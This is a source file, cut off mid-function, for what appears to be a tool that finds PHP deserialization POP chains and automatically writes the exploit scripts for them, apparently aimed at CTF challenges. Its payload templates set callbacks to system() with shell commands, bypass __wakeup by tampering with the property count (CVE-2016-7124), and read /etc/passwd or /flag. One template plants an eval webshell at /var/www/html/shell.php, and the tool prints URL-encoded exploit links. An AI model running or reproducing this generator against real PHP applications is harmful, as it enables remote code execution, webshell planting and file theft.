    private getPropertyFromNode(node: any): string {
        if (!node) return 'unknown';
        if (node.kind === 'parenthesis') {
            return this.getPropertyFromNode(node.inner);
        }
        if (node.kind !== 'propertylookup') return 'unknown';
        const offset = node.offset;
        if (offset?.kind === 'identifier') return offset.name || 'unknown';
        if (typeof offset === 'string') return offset;
        if (offset?.name) return offset.name;
        return 'unknown';
    }

    private extractArgStrings(args: any[]): string[] {
        if (!args || !Array.isArray(args)) return [];
        return args.map(arg => {
            if (this.isThisProperty(arg)) {
                return `$this->${this.getPropertyFromNode(arg)}`;
            }
            if (arg?.kind === 'variable') {
                return `$${arg.name || 'var'}`;
            }
            if (arg?.value !== undefined) {
                return JSON.stringify(arg.value);
            }
            return '?';
        });
    }

    private extractArgProperties(args: any[]): string[] {
        if (!args || !Array.isArray(args)) return [];
        return args
            .filter(arg => this.isThisProperty(arg))
            .map(arg => this.getPropertyFromNode(arg));
    }

    private getRiskLevel(funcName: string): 'critical' | 'high' | 'medium' | 'low' {
        const critical = ['eval', 'assert', 'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'];
        const high = ['call_user_func', 'call_user_func_array', 'include', 'require', 'preg_replace'];
        if (critical.includes(funcName.toLowerCase())) return 'critical';
        if (high.includes(funcName.toLowerCase())) return 'high';
        return 'medium';
    }

    /**
     * 检测属性注入漏洞
     * 这种漏洞不需要 POP 链，直接修改对象属性就能触发敏感操作
     * 例如: if($this->isAdmin === true) { echo $flag; }
     */
    private findPropertyInjectionVulns(gadgets: POPGadget[]): POPChainResult[] {
        const results: POPChainResult[] = [];

        // 遍历所有魔术方法
        const entryGadgets = gadgets.filter(g => 
            g.isMagic && ['__wakeup', '__destruct', '__toString'].includes(g.methodName)
        );

        for (const gadget of entryGadgets) {
            const classInfo = this.classMap.get(gadget.className);
            if (!classInfo) continue;

            const methodNode = classInfo.methods.find(m => m.name === gadget.methodName)?.node;
            if (!methodNode) continue;

            // 分析方法中的条件判断
            const conditions = this.analyzeConditions(methodNode, gadget.className);
            
            // 检测 __wakeup 是否会重置这些属性
            const wakeupGadget = gadgets.find(g => 
                g.className === gadget.className && g.methodName === '__wakeup'
            );
            const wakeupResets = wakeupGadget ? this.analyzeWakeupResets(
                classInfo.methods.find(m => m.name === '__wakeup')?.node,
                gadget.className
            ) : [];

            for (const cond of conditions) {
                if (!cond.isSensitive) continue;

                // 检查这个属性是否被 __wakeup 重置
                const isResetByWakeup = wakeupResets.some(r => r.propertyName === cond.propertyName);
                const needsBypassWakeup = isResetByWakeup && gadget.methodName !== '__wakeup';

                // 获取属性信息
                const allProps = this.getAllClassProperties(gadget.className);
                const propInfo = allProps.find(p => p.name === cond.propertyName);

                // 生成 payload
                const payload = this.generatePropertyInjectionPayload(
                    gadget.className,
                    cond,
                    propInfo?.visibility || 'public',
                    needsBypassWakeup,
                    allProps
                );

                const result: POPChainResult = {
                    entryClass: gadget.className,
                    entryMethod: gadget.methodName,
                    steps: [{
                        className: gadget.className,
                        methodName: gadget.methodName,
                        trigger: gadget.methodName === '__wakeup' ? '反序列化时触发' : 
                                 gadget.methodName === '__destruct' ? '对象销毁时触发' : '其他触发',
                        description: `检测到条件: $this->${cond.propertyName} ${cond.operator} ${JSON.stringify(cond.targetValue)}`,
                        line: cond.line,
                        reads: [`$this->${cond.propertyName}`],
                        writes: [],
                        calls: [],
                        operations: [cond.action]
                    }],
                    finalSink: cond.action,
                    riskLevel: 'high',
                    payload,
                    description: `属性注入: 设置 ${gadget.className}::$${cond.propertyName} = ${JSON.stringify(cond.targetValue)} 触发 ${cond.action}`,
                    exploitMethod: cond.action,
                    dataFlow: `unserialize() -> ${gadget.className}::${gadget.methodName}() -> if($this->${cond.propertyName}) -> ${cond.action}`,
                    paramName: this.unserializeParam.paramName,
                    paramSource: this.unserializeParam.paramSource,
                    vulnType: 'property_injection',
                    bypassWakeup: needsBypassWakeup
                };

                results.push(result);
            }
        }

        return results;
    }

    /**
     * 分析方法中的条件判断
     */
    private analyzeConditions(methodNode: any, className: string): PropertyCondition[] {
        const conditions: PropertyCondition[] = [];
        
        this.traverseNode(methodNode, (node: any) => {
            if (node.kind === 'if') {
                const cond = this.extractCondition(node.test, className, node);
                if (cond) {
                    conditions.push(cond);
                }
            }
        });

        return conditions;
    }

    /**
     * 提取条件表达式信息
     */
    private extractCondition(testNode: any, className: string, ifNode: any): PropertyCondition | null {
        if (!testNode) return null;

        // 处理 $this->prop === value 模式
        if (testNode.kind === 'bin') {
            const left = testNode.left;
            const right = testNode.right;
            const op = testNode.type;

            let propName: string | null = null;
            let targetValue: any = null;

            // 检查左边是否是 $this->prop
            if (this.isThisProperty(left)) {
                propName = this.getPropertyFromNode(left);
                targetValue = this.extractLiteralValue(right);
            } else if (this.isThisProperty(right)) {
                propName = this.getPropertyFromNode(right);
                targetValue = this.extractLiteralValue(left);
            }

            if (propName && targetValue !== undefined) {
                // 分析 if 块中的操作，判断是否是敏感操作
                const action = this.analyzeIfBlockAction(ifNode.body);
                const isSensitive = this.isSensitiveAction(action);

                return {
                    propertyName: propName,
                    operator: op as any,
                    targetValue,
                    line: testNode.loc?.start?.line || 1,
                    action,
                    isSensitive
                };
            }
        }

        return null;
    }

    /**
     * 分析 if 块中的操作
     */
    private analyzeIfBlockAction(body: any): string {
        if (!body) return '未知操作';

        const actions: string[] = [];
        
        this.traverseNode(body, (node: any) => {
            if (node.kind === 'echo' || node.kind === 'print') {
                // 检查是否输出敏感信息
                const text = this.extractEchoContent(node);
                if (text.toLowerCase().includes('flag') || text.toLowerCase().includes('admin') || 
                    text.toLowerCase().includes('secret') || text.toLowerCase().includes('welcome')) {
                    actions.push(`输出敏感信息: ${text.substring(0, 50)}`);
                }
            } else if (node.kind === 'call') {
                const funcName = node.what?.name || '';
                if (['system', 'exec', 'shell_exec', 'passthru', 'eval', 'file_get_contents', 'include', 'require'].includes(funcName)) {
                    actions.push(`调用危险函数: ${funcName}()`);
                }
            }
        });

        return actions.length > 0 ? actions.join('; ') : '执行代码块';
    }

    /**
     * 提取 echo 内容
     */
    private extractEchoContent(node: any): string {
        if (!node.expressions && !node.arguments) return '';
        
        const exprs = node.expressions || node.arguments || [];
        const parts: string[] = [];
        
        for (const expr of (Array.isArray(exprs) ? exprs : [exprs])) {
            if (expr.kind === 'string') {
                parts.push(expr.value || '');
            } else if (expr.kind === 'encapsed') {
                for (const part of (expr.value || [])) {
                    if (part.kind === 'string') {
                        parts.push(part.value || '');
                    }
                }
            }
        }
        
        return parts.join('');
    }

    /**
     * 判断是否是敏感操作
     */
    private isSensitiveAction(action: string): boolean {
        const sensitiveKeywords = ['flag', 'admin', 'secret', 'password', 'key', 'token', 
                                   'system', 'exec', 'shell', 'eval', 'include', 'require'];
        return sensitiveKeywords.some(kw => action.toLowerCase().includes(kw));
    }

    /**
     * 分析 __wakeup 中的属性重置
     */
    private analyzeWakeupResets(methodNode: any, className: string): WakeupReset[] {
        const resets: WakeupReset[] = [];
        if (!methodNode) return resets;

        this.traverseNode(methodNode, (node: any) => {
            // 检测 $this->prop = value 赋值
            if (node.kind === 'assign' || node.kind === 'expressionstatement') {
                const assignNode = node.kind === 'assign' ? node : node.expression;
                if (assignNode?.kind === 'assign') {
                    const left = assignNode.left;
                    if (this.isThisProperty(left)) {
                        const propName = this.getPropertyFromNode(left);
                        const resetValue = this.extractLiteralValue(assignNode.right);
                        if (propName) {
                            resets.push({
                                propertyName: propName,
                                resetValue,
                                line: node.loc?.start?.line || 1
                            });
                        }
                    }
                }
            }
        });

        return resets;
    }

    /**
     * 提取字面量值
     */
    private extractLiteralValue(node: any): any {
        if (!node) return undefined;
        
        switch (node.kind) {
            case 'boolean': return node.value;
            case 'number': return node.value;
            case 'string': return node.value;
            case 'nullkeyword': return null;
            case 'array': return [];
            default: return undefined;
        }
    }

    /**
     * 生成属性注入 payload
     */
    private generatePropertyInjectionPayload(
        className: string,
        condition: PropertyCondition,
        visibility: string,
        needsBypassWakeup: boolean,
        allProps: PropertyInfo[]
    ): string {
        let code = `<?php\n/**\n * 属性注入漏洞利用\n * 目标: ${className}::$${condition.propertyName} = ${JSON.stringify(condition.targetValue)}\n`;
        if (needsBypassWakeup) {
            code += ` * 注意: 需要绕过 __wakeup (CVE-2016-7124)\n`;
        }
        code += ` */\n\n`;

        // 生成类定义
        const classInfo = this.classMap.get(className);
        code += `class ${className} {\n`;
        for (const prop of allProps) {
            code += `    ${prop.visibility} $${prop.name};\n`;
        }
        code += `}\n\n`;

        // 生成 exploit 对象
        code += `$exploit = new ${className}();\n`;
        
        // 设置目标属性
        const targetValue = this.phpValueToString(condition.targetValue);
        if (visibility === 'public') {
            code += `$exploit->${condition.propertyName} = ${targetValue};  // 关键属性\n`;
        } else {
            code += `// ${condition.propertyName} 是 ${visibility} 属性，需要使用反射或手动构造序列化字符串\n`;
            code += `// 序列化格式: `;
            if (visibility === 'private') {
                code += `\\x00${className}\\x00${condition.propertyName}\n`;
            } else {
                code += `\\x00*\\x00${condition.propertyName}\n`;
            }
        }

        code += `\n$payload = serialize($exploit);\n\n`;

        // 如果是 private/protected，需要手动构造
        if (visibility !== 'public') {
            code += `// === 手动构造 ${visibility} 属性的序列化字符串 ===\n`;
            const propCount = allProps.length;
            if (visibility === 'private') {
                code += `$payload = 'O:${className.length}:"${className}":${propCount}:{`;
                code += `s:${className.length + condition.propertyName.length + 2}:"\\x00${className}\\x00${condition.propertyName}";`;
            } else {
                code += `$payload = 'O:${className.length}:"${className}":${propCount}:{`;
                code += `s:${condition.propertyName.length + 3}:"\\x00*\\x00${condition.propertyName}";`;
            }
            code += `${this.serializeValue(condition.targetValue)}`;
            code += `}';\n\n`;
        }

        // 绕过 __wakeup
        if (needsBypassWakeup) {
            code += `// === 绕过 __wakeup (修改属性数量) ===\n`;
            code += `// 将 ${className}:X: 改为 ${className}:(X+1):\n`;
            code += `$payload = preg_replace('/O:(\\d+):"${className}":(\\d+):/', 'O:$1:"${className}":' . ($2 + 1) . ':', $payload);\n`;
            code += `// 或者手动: 将属性数量加1\n\n`;
        }

        // 输出
        code += `echo "Payload (raw):\\n" . $payload . "\\n\\n";\n`;
        code += `echo "Payload (URL):\\n" . urlencode($payload) . "\\n\\n";\n`;

        // 生成 URL
        if (this.unserializeParam.paramName && this.unserializeParam.paramSource === '$_GET') {
            code += `echo "利用URL:\\nhttp://target/?${this.unserializeParam.paramName}=" . urlencode($payload) . "\\n";\n`;
        }

        return code;
    }

    /**
     * PHP 值转字符串
     */
    private phpValueToString(value: any): string {
        if (value === true) return 'true';
        if (value === false) return 'false';
        if (value === null) return 'null';
        if (typeof value === 'string') return `"${value}"`;
        if (typeof value === 'number') return String(value);
        return 'null';
    }

    /**
     * 序列化值
     */
    private serializeValue(value: any): string {
        if (value === true) return 'b:1;';
        if (value === false) return 'b:0;';
        if (value === null) return 'N;';
        if (typeof value === 'string') return `s:${value.length}:"${value}";`;
        if (typeof value === 'number') {
            if (Number.isInteger(value)) return `i:${value};`;
            return `d:${value};`;
        }
        return 'N;';
    }

    /**
     * 通用节点遍历
     */
    private traverseNode(node: any, callback: (node: any) => void): void {
        if (!node) return;
        
        callback(node);
        
        if (Array.isArray(node)) {
            node.forEach(child => this.traverseNode(child, callback));
        } else if (typeof node === 'object') {
            for (const key of Object.keys(node)) {
                if (key === 'loc' || key === 'leadingComments' || key === 'trailingComments') continue;
                const child = node[key];
                if (child && typeof child === 'object') {
                    this.traverseNode(child, callback);
                }
            }
        }
    }

    /**
     * 构建完整的攻击链
     */
    private buildCompleteChains(gadgets: POPGadget[]): POPChainResult[] {
        const chains: POPChainResult[] = [];
        
        // 找入口点 (魔术方法)
        const entryGadgets = gadgets.filter(g => 
            g.isMagic && ['__wakeup', '__destruct', '__toString'].includes(g.methodName)
        );

        for (const entry of entryGadgets) {
            // 尝试构建从入口到危险操作的链
            const chain = this.buildChainFromGadget(entry, gadgets, new Set());
            if (chain) {
                chains.push(chain);
            }
        }

        return chains;
    }

    /**
     * 从单个 gadget 构建链
     */
    private buildChainFromGadget(
        gadget: POPGadget, 
        allGadgets: POPGadget[], 
        visited: Set<string>
    ): POPChainResult | null {
        const key = `${gadget.className}::${gadget.methodName}`;
        if (visited.has(key)) return null;
        visited.add(key);

        const steps: ChainStep[] = [];
        const payloadProps: PayloadProperty[] = [];

        // 入口步骤
        steps.push(this.createChainStep(gadget));

        // 分析触发器，找下一跳
        for (const trigger of gadget.triggers) {
            // === 处理 method_call: 调用本类的其他方法 ===
            if (trigger.type === 'method_call' && trigger.targetMethod) {
                // 找本类的目标方法
                const sameClassGadget = allGadgets.find(g => 
                    g.className === gadget.className && g.methodName === trigger.targetMethod
                );
                
                if (sameClassGadget) {
                    // 递归处理该方法的触发器（把它的触发器合并到当前gadget）
                    for (const innerTrigger of sameClassGadget.triggers) {
                        if (innerTrigger.type === 'object_method' && innerTrigger.targetMethod) {
                            // 找有这个方法的其他类
                            const targetGadget = allGadgets.find(g => 
                                g.methodName === innerTrigger.targetMethod && g.className !== gadget.className
                            );
                            
                            if (targetGadget && targetGadget.dangerousCalls.length > 0) {
                                steps.push(this.createChainStep(targetGadget, innerTrigger));
                            }
                        }
                    }
                }
            }

            // === 处理 object_method: 调用其他对象的方法 ===
            if (trigger.type === 'object_method' && trigger.targetMethod) {
                // 找有这个方法的类
                const targetGadget = allGadgets.find(g => 
                    g.methodName === trigger.targetMethod && g.className !== gadget.className
                );
                
                if (targetGadget) {
                    // 检查这个方法是否有危险操作
                    if (targetGadget.dangerousCalls.length > 0) {
                        steps.push(this.createChainStep(targetGadget, trigger));
                        
                        // 构建 payload
                        const innerPayload = this.buildPayloadForGadget(targetGadget);
                        if (trigger.propertyUsed) {
                            payloadProps.push({
                                name: trigger.propertyUsed,
                                value: innerPayload,
                                comment: `设置为 ${targetGadget.className} 对象`
                            });
                        }
                        payloadProps.push({
                            name: 'id',  // 方法名属性（假设）
                            value: `"${trigger.targetMethod}"`,
                            comment: `调用的方法名`
                        });
                    }
                }
            }

            if (trigger.type === '__invoke') {
                const invokeGadget = allGadgets.find(g => g.methodName === '__invoke');
                if (invokeGadget) {
                    steps.push(this.createChainStep(invokeGadget, trigger));
                }
            }
        }

        // 分析属性使用，检测 ($this->c)() 无参调用模式
        for (const prop of gadget.properties) {
            if (prop.type === 'dynamic_func' && prop.details) {
                const hasArgs = prop.details.argumentProps && prop.details.argumentProps.length > 0;
                
                if (!hasArgs) {
                    // 无参数调用 ($this->c)() - 需要使用数组 Callable
                    // 找到可用的回调方法并添加到链中
                    const usefulMethod = this.findUsefulMethodForCallback(allGadgets, gadget.className);
                    if (usefulMethod) {
                        // 检查是否有对应的 gadget
                        const callbackGadget = allGadgets.find(g => 
                            g.className === usefulMethod.className && g.methodName === usefulMethod.methodName
                        );
                        
                        if (callbackGadget) {
                            steps.push({
                                className: callbackGadget.className,
                                methodName: callbackGadget.methodName,
                                trigger: `数组Callable调用 [${callbackGadget.className}, '${callbackGadget.methodName}']`,
                                description: `通过 ($this->${prop.name})() 调用`,
                                line: callbackGadget.startLine,
                                reads: callbackGadget.properties.filter(p => p.type === 'read').map(p => `$this->${p.name}`),
                                writes: callbackGadget.properties.filter(p => p.type === 'write').map(p => `$this->${p.name}`),
                                calls: callbackGadget.dangerousCalls.map(d => d.pattern),
                                operations: callbackGadget.dangerousCalls.map(d => d.description),
                                codePattern: callbackGadget.codePattern
                            });
                        } else {
                            // 没有 gadget 但有方法信息，也添加到链中
                            const methodInfo = this.classMap.get(usefulMethod.className)?.methods.find(
                                m => m.name === usefulMethod.methodName
                            );
                            if (methodInfo) {
                                steps.push({
                                    className: usefulMethod.className,
                                    methodName: usefulMethod.methodName,
                                    trigger: `数组Callable调用 [${usefulMethod.className}, '${usefulMethod.methodName}']`,
                                    description: `通过 ($this->${prop.name})() 调用`,
                                    line: methodInfo.startLine,
                                    reads: [],
                                    writes: [],
                                    calls: [],
                                    operations: ['执行方法体']
                                });
                            }
                        }
                    }
                }
            }
        }

        // 如果有危险调用，生成最终的 payload
        let finalSink = '';
        let riskLevel: 'critical' | 'high' | 'medium' | 'low' = 'medium';
        let exploitMethod = '';

        // 收集所有危险调用
        const allDangerousCalls: DangerousCall[] = [];
        for (const step of steps) {
            const g = this.gadgetMap.get(`${step.className}::${step.methodName}`);
            if (g) {
                allDangerousCalls.push(...g.dangerousCalls);
            }
        }

        if (allDangerousCalls.length > 0) {
            const mostDangerous = allDangerousCalls.reduce((a, b) => 
                this.compareRisk(a.riskLevel, b.riskLevel) > 0 ? a : b
            );
            finalSink = mostDangerous.pattern;
            riskLevel = mostDangerous.riskLevel;
            exploitMethod = mostDangerous.description;
        }

        if (steps.length === 0 || !finalSink) {
            // 尝试直接利用入口的危险调用
            if (gadget.dangerousCalls.length > 0) {
                const danger = gadget.dangerousCalls[0];
                finalSink = danger.pattern;
                riskLevel = danger.riskLevel;
                exploitMethod = danger.description;
            }
        }

        // 如果还没有找到 finalSink，但是有通过回调调用的方法（如 A::test），
        // 将最后一个回调方法标记为 sink
        if (!finalSink && steps.length > 1) {
            const lastStep = steps[steps.length - 1];
            if (lastStep.trigger?.includes('Callable') || lastStep.trigger?.includes('回调')) {
                finalSink = `${lastStep.className}::${lastStep.methodName}()`;
                riskLevel = 'high';
                exploitMethod = `通过数组Callable调用 ${lastStep.className}::${lastStep.methodName}()`;
            }
        }

        if (!finalSink) return null;

        // 生成智能 payload
        const payloadCode = this.generateSmartPayload(gadget, steps, allGadgets);
        const dataFlow = this.generateDataFlow(steps);

        return {
            entryClass: gadget.className,
            entryMethod: gadget.methodName,
            steps,
            finalSink,
            riskLevel,
            payload: payloadCode,
            description: this.generateDescription(steps),
            exploitMethod,
            dataFlow,
            paramName: this.unserializeParam.paramName,
            paramSource: this.unserializeParam.paramSource
        };
    }

    private createChainStep(gadget: POPGadget, trigger?: TriggerInfo): ChainStep {
        return {
            className: gadget.className,
            methodName: gadget.methodName,
            trigger: trigger?.type || (gadget.methodName === '__wakeup' ? '反序列化触发' : 
                     gadget.methodName === '__destruct' ? '对象销毁触发' : '魔术方法触发'),
            description: trigger?.description || MAGIC_METHODS[gadget.methodName] || '',
            line: gadget.startLine,
            reads: gadget.properties.filter(p => p.type === 'read').map(p => `$this->${p.name}`),
            writes: gadget.properties.filter(p => p.type === 'write').map(p => `$this->${p.name}`),
            calls: gadget.dangerousCalls.map(d => d.pattern),
            operations: gadget.dangerousCalls.map(d => d.description),
            codePattern: gadget.codePattern
        };
    }

    private buildPayloadForGadget(gadget: POPGadget): PayloadObject {
        const props: PayloadProperty[] = [];
        
        for (const dc of gadget.dangerousCalls) {
            // 提取需要设置的属性
            const propMatch = dc.functionName.match(/\$this->(\w+)/);
            if (propMatch) {
                props.push({
                    name: propMatch[1],
                    value: '"system"',
                    comment: '设置为危险函数名'
                });
            }
        }

        return {
            className: gadget.className,
            properties: props
        };
    }

    private compareRisk(a: string, b: string): number {
        const order = ['critical', 'high', 'medium', 'low'];
        return order.indexOf(b) - order.indexOf(a);
    }

    /**
     * 生成智能 Payload - 核心改进
     * 正确处理嵌套对象结构：
     * - ($this->obj)->$method($arg) 模式需要 $this->obj 是对象
     * - ($this->func)($arg) 模式需要 $this->func 是函数名字符串
     */
    private generateSmartPayload(entry: POPGadget, steps: ChainStep[], allGadgets: POPGadget[]): string {
        // 收集所有需要的类
        const neededClasses = new Set<string>();
        const addClassWithParent = (className: string) => {
            if (!className || neededClasses.has(className)) return;
            neededClasses.add(className);
            const classInfo = this.classMap.get(className);
            if (classInfo?.extends) {
                addClassWithParent(classInfo.extends);
            }
        };
        
        // 先添加入口类和步骤中的类
        addClassWithParent(entry.className);
        steps.forEach(s => addClassWithParent(s.className));
        
        // 收集需要的对象变量和入口属性
        const objectVars: Array<{varName: string, className: string, props: Array<{name: string, value: string, comment: string}>}> = [];
        const entryProps: Array<{name: string, value: string, comment: string}> = [];
        
        // === 新逻辑：分析整个链路，找出需要的属性设置 ===
        
        // 1. 分析入口类调用的方法，找到对象方法调用
        const entryClassInfo = this.classMap.get(entry.className);
        const entryGadget = this.gadgetMap.get(`${entry.className}::${entry.methodName}`);
        
        // 找入口类的 method_call 触发的方法
        let mainMethodGadget = entryGadget;
        if (entryGadget) {
            for (const trigger of entryGadget.triggers) {
                if (trigger.type === 'method_call' && trigger.targetMethod) {
                    const sameClassGadget = this.gadgetMap.get(`${entry.className}::${trigger.targetMethod}`);
                    if (sameClassGadget) {
                        mainMethodGadget = sameClassGadget;
                        break;
                    }
                }
            }
        }

        // 2. 分析主方法的 object_method 调用
        if (mainMethodGadget) {
            for (const prop of mainMethodGadget.properties) {
                if (prop.type === 'object_call' && prop.details) {
                    const objPropName = prop.name;  // e.g., 'processor'
                    const calledMethod = prop.details.calledMethod;  // e.g., 'transform'
                    const argProps = prop.details.argumentProps || [];  // e.g., ['data']
                    
                    // 找有这个方法的 gadget
                    const targetGadget = allGadgets.find(g => 
                        g.methodName === calledMethod && g.className !== entry.className
                    );
                    
                    if (targetGadget) {
                        addClassWithParent(targetGadget.className);
                        const targetProps: Array<{name: string, value: string, comment: string}> = [];
                        
                        // 分析目标方法的危险调用
                        for (const dc of targetGadget.dangerousCalls) {
                            // call_user_func($this->callback, $data)
                            if (dc.functionName === 'call_user_func') {
                                // 第一个参数通常是函数名属性
                                if (dc.arguments.length > 0 && dc.arguments[0].startsWith('$this->')) {
                                    const callbackProp = dc.arguments[0].replace('$this->', '');
                                    
                                    // 检查是否有 __toString 可以触发文件读取
                                    // 直接检查：__toString 有 file_get_contents
                                    // 间接检查：__toString 调用的方法有 file_get_contents
                                    let toStringGadget = allGadgets.find(g => 
                                        g.methodName === '__toString' && 
                                        g.dangerousCalls.some(d => d.functionName.includes('file_get_contents'))
                                    );
                                    
                                    // 间接检查：__toString 调用其他方法
                                    if (!toStringGadget) {
                                        toStringGadget = allGadgets.find(g => {
                                            if (g.methodName !== '__toString') return false;
                                            // 检查 __toString 调用的方法
                                            for (const trigger of g.triggers) {
                                                if (trigger.type === 'method_call' && trigger.targetMethod) {
                                                    // 查找同类的目标方法
                                                    const calledGadget = allGadgets.find(cg => 
                                                        cg.className === g.className && 
                                                        cg.methodName === trigger.targetMethod
                                                    );
                                                    if (calledGadget?.dangerousCalls.some(d => 
                                                        d.functionName.includes('file_get_contents') ||
                                                        d.functionName.includes('file') ||
                                                        d.functionName.includes('readfile')
                                                    )) {
                                                        return true;
                                                    }
                                                }
                                            }
                                            return false;
                                        });
                                    }
                                    
                                    if (toStringGadget) {
                                        // 使用 strval 触发 __toString
                                        targetProps.push({
                                            name: callbackProp,
                                            value: '"strval"',
                                            comment: '使用 strval 触发 __toString'
                                        });
                                        
                                        addClassWithParent(toStringGadget.className);
                                        
                                        // FileReader 需要 filename
                                        const fileReaderProps: Array<{name: string, value: string, comment: string}> = [];
                                        const frClassInfo = this.classMap.get(toStringGadget.className);
                                        if (frClassInfo) {
                                            for (const frProp of frClassInfo.properties) {
                                                if (frProp.name === 'filename') {
                                                    fileReaderProps.push({
                                                        name: 'filename',
                                                        value: '"/flag"',
                                                        comment: '要读取的文件 (改为目标路径)'
                                                    });
                                                }
                                            }
                                        }
                                        
                                        objectVars.push({
                                            varName: '$fileReader',
                                            className: toStringGadget.className,
                                            props: fileReaderProps
                                        });
                                        
                                        // 入口的 data 属性指向 FileReader
                                        for (const argProp of argProps) {
                                            entryProps.push({
                                                name: argProp,
                                                value: '$fileReader',
                                                comment: `${toStringGadget.className} 对象 (触发 __toString)`
                                            });
                                        }
                                    } else {
                                        // 没有 __toString gadget，直接用 system
                                        targetProps.push({
                                            name: callbackProp,
                                            value: '"system"',
                                            comment: '危险函数名 (可改为 exec, passthru 等)'
                                        });
                                        
                                        // data 参数作为命令
                                        for (const argProp of argProps) {
                                            entryProps.push({
                                                name: argProp,
                                                value: '"whoami"',
                                                comment: '命令参数'
                                            });
                                        }
                                    }
                                }
                            }
                            
                            // 其他危险函数处理
                            if (dc.isDynamic) {
                                const match = dc.pattern.match(/\(\$this->(\w+)\)\(/);
                                if (match && !targetProps.some(p => p.name === match[1])) {
                                    targetProps.push({
                                        name: match[1],
                                        value: '"system"',
                                        comment: '危险函数名'
                                    });
                                }
                            }
                        }
                        
                        objectVars.push({
                            varName: '$target',
                            className: targetGadget.className,
                            props: targetProps
                        });
                        
                        entryProps.push({
                            name: objPropName,
                            value: '$target',
                            comment: `${targetGadget.className} 对象`
                        });
                    }
                }
            }
        }
        
        // 分析入口 gadget 的调用模式（保留原有逻辑作为备用）
        if (entryGadget && entryProps.length === 0) {
            // 分析入口点需要的属性
            for (const prop of entryGadget.properties) {
                if (prop.type === 'object_call' && prop.details) {
                    const objPropName = prop.name;
                    const methodProp = prop.details.calledMethodProp;
                    const argProps = prop.details.argumentProps || [];
                    
                    if (methodProp) {
                        const targetGadget = this.findGadgetWithDangerousMethod(allGadgets, entry.className);
                        
                        if (targetGadget) {
                            addClassWithParent(targetGadget.className);
                            const innerProps: Array<{name: string, value: string, comment: string}> = [];
                            
                            for (const dc of targetGadget.dangerousCalls) {
                                if (dc.isDynamic) {
                                    const match = dc.pattern.match(/\(\$this->(\w+)\)\(/);
                                    if (match) {
                                        innerProps.push({
                                            name: match[1],
                                            value: '"system"',
                                            comment: '危险函数名 (可改为 eval, exec 等)'
                                        });
                                    }
                                }
                            }
                            
                            const targetClass = this.classMap.get(targetGadget.className);
                            const hasWakeup = targetClass?.methods.some(m => m.name === '__wakeup');
                            if (hasWakeup) {
                                // 获取所有属性（包括父类继承的）
                                const allProps = this.getAllClassProperties(targetGadget.className);
                                for (const classProp of allProps) {
                                    if (!innerProps.some(ip => ip.name === classProp.name)) {
                                        innerProps.push({
                                            name: classProp.name,
                                            value: 'new stdClass()',
                                            comment: `防止 __wakeup 报错`
                                        });
                                    }
                                }
                            }
                            
                            objectVars.push({ varName: '$inner', className: targetGadget.className, props: innerProps });
                            entryProps.push({ name: objPropName, value: '$inner', comment: `${targetGadget.className} 对象` });
                            entryProps.push({ name: methodProp, value: `"${targetGadget.methodName}"`, comment: `要调用的方法名` });
                            
                            for (const argProp of argProps) {
                                entryProps.push({ name: argProp, value: '"whoami"', comment: '命令参数 (可修改)' });
                            }
                        }
                    }
                } else if (prop.type === 'dynamic_func' && prop.details) {
                    const hasArgs = prop.details.argumentProps && prop.details.argumentProps.length > 0;
                    
                    if (hasArgs) {
                        entryProps.push({ name: prop.name, value: '"system"', comment: '危险函数名' });
                        for (const argProp of (prop.details.argumentProps || [])) {
                            entryProps.push({ name: argProp, value: '"whoami"', comment: '命令参数' });
                        }
                    } else {
                        const usefulMethod = this.findUsefulMethodForCallback(allGadgets, entry.className);
                        if (usefulMethod) {
                            addClassWithParent(usefulMethod.className);
                            objectVars.push({ varName: '$callbackObj', className: usefulMethod.className, props: [] });
                            entryProps.push({
                                name: prop.name,
                                value: `[$callbackObj, '${usefulMethod.methodName}']`,
                                comment: `数组Callable: 调用 ${usefulMethod.className}::${usefulMethod.methodName}()`
                            });
                        } else {
                            entryProps.push({ name: prop.name, value: '"phpinfo"', comment: '无参函数' });
                        }
                    }
                }
            }
            
            // 如果没有找到复杂模式，尝试直接危险调用
            if (entryProps.length === 0) {
                for (const dc of entryGadget.dangerousCalls) {
                    if (dc.isDynamic) {
                        const match = dc.pattern.match(/\(\$this->(\w+)\)\(([^)]*)\)/);
                        if (match) {
                            entryProps.push({ name: match[1], value: '"system"', comment: '危险函数名' });
                        }
                    }
                    
                    const funcName = dc.functionName.toLowerCase();
                    const isFileWrite = ['file_put_contents', 'fwrite', 'fputs'].some(f => funcName.includes(f));
                    const isFileRead = ['file_get_contents', 'file', 'readfile', 'fread'].some(f => funcName.includes(f));
                    const isInclude = ['include', 'require'].some(f => funcName.includes(f));
                    const isExec = ['system', 'exec', 'shell_exec', 'passthru', 'popen'].some(f => funcName.includes(f));
                    const isEval = ['eval', 'assert', 'preg_replace'].some(f => funcName.includes(f));
                    
                    for (let i = 0; i < dc.arguments.length; i++) {
                        const arg = dc.arguments[i];
                        if (arg.startsWith('$this->')) {
                            const propName = arg.replace('$this->', '');
                            if (!entryProps.some(p => p.name === propName)) {
                                let value = '"payload"', comment = '参数';
                                if (isFileWrite) {
                                    value = i === 0 ? '"/var/www/html/shell.php"' : '"<?php @eval($_POST[cmd]);?>"';
                                    comment = i === 0 ? '写入的文件路径' : '写入的内容 (webshell)';
                                } else if (isFileRead || isInclude) {
                                    value = '"/etc/passwd"'; comment = '读取的文件路径';
                                } else if (isExec) {
                                    value = '"whoami"'; comment = '执行的系统命令';
                                } else if (isEval) {
                                    value = '"phpinfo();"'; comment = '执行的PHP代码';
                                }
                                entryProps.push({ name: propName, value, comment });
                            }
                        }
                    }
                }
            }
        }

        // 按继承顺序排序（父类在前）
        const sortedClasses: string[] = [];
        const addInOrder = (className: string) => {
            if (sortedClasses.includes(className)) return;
            const classInfo = this.classMap.get(className);
            if (classInfo?.extends && neededClasses.has(classInfo.extends)) {
                addInOrder(classInfo.extends);
            }
            sortedClasses.push(className);
        };
        neededClasses.forEach(c => addInOrder(c));

        // 生成代码
        let code = `<?php\n/**\n * POP Chain Exploit Payload\n * 链路: ${steps.map(s => `${s.className}::${s.methodName}`).join(' -> ')}\n */\n\n`;
        
        // 生成类定义骨架
        code += `// === 类定义 (复制目标的类结构) ===\n`;
        for (const className of sortedClasses) {
            const classInfo = this.classMap.get(className);
            if (classInfo) {
                code += `class ${className}`;
                if (classInfo.extends) code += ` extends ${classInfo.extends}`;
                code += ` {\n`;
                for (const prop of classInfo.properties) {
                    code += `    ${prop.visibility} $${prop.name};\n`;
                }
                code += `}\n\n`;
            }
        }

        code += `// === 构造利用链 ===\n`;
        
        // 生成内层对象
        for (const obj of objectVars) {
